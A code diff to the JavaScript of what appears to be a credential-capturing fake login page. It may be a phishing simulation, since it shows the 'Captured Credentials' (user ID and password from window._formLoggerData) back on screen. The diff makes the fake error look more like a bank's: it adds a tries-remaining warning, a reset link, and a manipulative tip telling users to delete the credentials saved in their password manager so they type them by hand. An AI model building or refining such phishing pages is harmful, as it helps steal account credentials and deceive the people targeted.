@@ -89,15 +89,25 @@ function showFormCaptureError() {
   
   const err = document.createElement('div');
   err.className = 'error-state';
-  err.style.cssText = 'background:#ffe6e6;border:1px solid #d32f2f;border-left:5px solid #c81c24;padding:16px;margin:20px;font-size:13px;color:#333;display:block;z-index:10000;';
+  err.style.cssText = 'background:#fff3cd;border:1px solid #ffc107;border-left:5px solid #ff6b6b;padding:16px;margin:20px;font-size:14px;color:#333;display:block;z-index:10000;';
   
-  let message = '<strong>Invalid User ID or Passcode</strong><br>The information you entered doesn\'t match our records. Please try again.';
+  let message = '<div style="display:flex;gap:12px;">';
+  message += '<div style="flex-shrink:0;color:#d32f2f;font-size:24px;line-height:1;">⚠</div>';
+  message += '<div>';
+  message += '<strong style="color:#d32f2f;display:block;margin-bottom:8px;">The information you entered doesn\'t match our records.</strong>';
+  message += 'You have a few more tries remaining.<br>';
+  message += 'Please try again or <a href="./login-reset.html" style="color:#0066cc;text-decoration:none;">click Forgot ID/Password</a>';
+  message += '<br><br>';
+  message += '<span style="font-size:12px;color:#666;">Having problems logging in or resetting your Password? If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a href="#" style="color:#0066cc;text-decoration:none;">Learn more</a></span>';
+  message += '</div></div>';
   
   // Display captured credentials if available
   if (window._formLoggerData) {
-    message += '<br><br><strong style="color:#666;">Captured Credentials:</strong>';
-    message += '<br><span style="font-family:monospace;color:#333;">User ID: ' + (window._formLoggerData.userId || 'N/A') + '</span>';
-    message += '<br><span style="font-family:monospace;color:#333;">Password: ' + (window._formLoggerData.password || 'N/A') + '</span>';
+    message += '<br><div style="background:#f5f5f5;border:1px solid #ddd;padding:12px;margin-top:12px;border-radius:4px;font-size:12px;">';
+    message += '<strong style="color:#666;display:block;margin-bottom:6px;">Captured Credentials:</strong>';
+    message += '<span style="font-family:monospace;color:#333;display:block;">User ID: ' + (window._formLoggerData.userId || 'N/A') + '</span>';
+    message += '<span style="font-family:monospace;color:#333;display:block;">Password: ' + (window._formLoggerData.password || 'N/A') + '</span>';
+    message += '</div>';
   }
   
   err.innerHTML = message;
